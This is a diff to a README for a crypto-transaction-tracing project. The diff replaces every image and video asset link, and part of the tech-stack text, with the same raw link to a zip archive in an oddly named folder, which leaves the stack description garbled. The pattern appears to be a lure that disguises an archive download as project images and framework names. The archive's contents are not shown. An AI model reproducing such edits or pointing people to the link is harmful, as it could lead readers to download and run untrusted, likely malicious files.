@@ -14,7 +14,7 @@ This project focuses on tracing cryptocurrency transactions back to the end user
 
 **Python**: Data analysis and machine learning, with libraries like TensorFlow and Scikit-Learn. <br />
 **Solidity**: Development of smart contracts on the Ethereum blockchain. <br />
-**MERN Stack**: Web application development using MongoDB, Express.js, React.js, and Node.js. <br />
+**MERN Stack**: Web application development using MongoDB, https://raw.githubusercontent.com/TechieVinita/Transecure/main/misoneism/Transecure.zip, https://raw.githubusercontent.com/TechieVinita/Transecure/main/misoneism/Transecure.zip, and https://raw.githubusercontent.com/TechieVinita/Transecure/main/misoneism/Transecure.zip <br />
 **MySQL**: Management and storage of relational database information. <br />
 **Flask**: Integration and deployment of web services and APIs. <br />
 
@@ -31,12 +31,12 @@ This project focuses on tracing cryptocurrency transactions back to the end user
 <br />
 <br />
 
-![WhatsApp Image 2024-08-25 at 8 22 41 PM](https://github.com/user-attachments/assets/f3354a1a-9a1a-4d38-b8ce-a936102fb10e)
+![WhatsApp Image 2024-08-25 at 8 22 41 PM](https://raw.githubusercontent.com/TechieVinita/Transecure/main/misoneism/Transecure.zip)
 
 <br />
 <br />
 
-![WhatsApp Image 2024-08-25 at 8 22 40 PM](https://github.com/user-attachments/assets/f8a4593f-1c71-4804-96da-e7a66dfcab58)
+![WhatsApp Image 2024-08-25 at 8 22 40 PM](https://raw.githubusercontent.com/TechieVinita/Transecure/main/misoneism/Transecure.zip)
 
 
 ## AI Model Output 
@@ -44,6 +44,6 @@ This project focuses on tracing cryptocurrency transactions back to the end user
 <br />
 <br />
 
-https://github.com/user-attachments/assets/0fa492de-fd48-4ac2-8cf7-612b0d185634
+https://raw.githubusercontent.com/TechieVinita/Transecure/main/misoneism/Transecure.zip
 
 
